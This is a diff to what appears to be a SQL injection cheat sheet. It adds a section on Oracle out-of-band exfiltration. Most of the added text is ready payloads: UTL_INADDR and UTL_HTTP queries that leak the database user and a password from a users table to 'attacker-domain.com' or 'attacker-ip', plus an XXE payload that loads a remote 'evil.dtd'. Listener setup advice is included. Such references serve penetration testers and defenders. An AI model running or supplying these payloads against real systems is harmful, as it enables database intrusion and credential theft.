@@ -206,11 +206,44 @@ BEGIN
 END;
 ```
 
-### Out-of-band (OOB) exfiltration via DNS
+---
+
+### Out-of-band (OOB) exfiltration
+Used when there's no visible output channel at all (errors suppressed, no union output, timing unreliable). The idea: force the Oracle process to make an *outbound* DNS or HTTP request to a listener you control, with stolen data encoded into the request.
+ 
+**Listener setup:** run a DNS server you control (`dnschef`, `Responder`, or Burp Collaborator/interactsh) to capture resolution attempts, or a plain HTTP listener for the UTL_HTTP variant.
+ 
+#### DNS-based exfiltration via UTL_INADDR
+`UTL_INADDR.GET_HOST_ADDRESS` performs a DNS lookup on whatever hostname you give it — concatenate stolen data as a subdomain:
 ```sql
 SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL) || '.attacker-domain.com') FROM DUAL;
-SELECT EXTRACTVALUE(xmltype('<r><v>test</v></r>'), '/r/v[1]/text()') FROM DUAL; -- classic OOB via HTTP/XXE-style
+SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1) || '.attacker-domain.com') FROM DUAL;
 ```
+This causes Oracle to attempt DNS resolution of `<stolen-data>.attacker-domain.com`, visible in your DNS server logs — works even when direct HTTP/SMB egress is blocked.
+ 
+#### DNS-based exfiltration via UTL_HTTP (requires network ACL grant in 11g+)
+```sql
+SELECT UTL_HTTP.REQUEST('http://' || (SELECT user FROM DUAL) || '.attacker-domain.com/') FROM DUAL;
+```
+ 
+#### HTTP-based exfiltration via UTL_HTTP directly
+```sql
+SELECT UTL_HTTP.REQUEST('http://attacker-ip/?d=' || (SELECT user FROM DUAL)) FROM DUAL;
+```
+> Oracle 11g+ requires an explicit `ACL` (Access Control List) grant via `DBMS_NETWORK_ACL_ADMIN` before `UTL_HTTP`/`UTL_TCP`/`UTL_SMTP` can reach external hosts — this significantly limits OOB in modern, properly-configured instances unless you already have DBA privileges to grant it yourself.
+ 
+#### XXE-based OOB (via XML parsing functions)
+Oracle's XML functions can be abused to trigger external entity resolution, which itself becomes an OOB channel:
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker-ip/evil.dtd">%remote;]><r>test</r>'), '/r') FROM DUAL;
+```
+ 
+#### Why use OOB over error/time-based
+- Bypasses response suppression entirely — no visible output needed at all
+- `UTL_INADDR` requires no special grants (works for most low-privileged users), making it a very common go-to for Oracle blind SQLi
+- DNS variant works even when HTTP/SMB egress is fully blocked, since DNS resolution is rarely restricte
+
+---
 
 ### Comment syntax
 ```sql
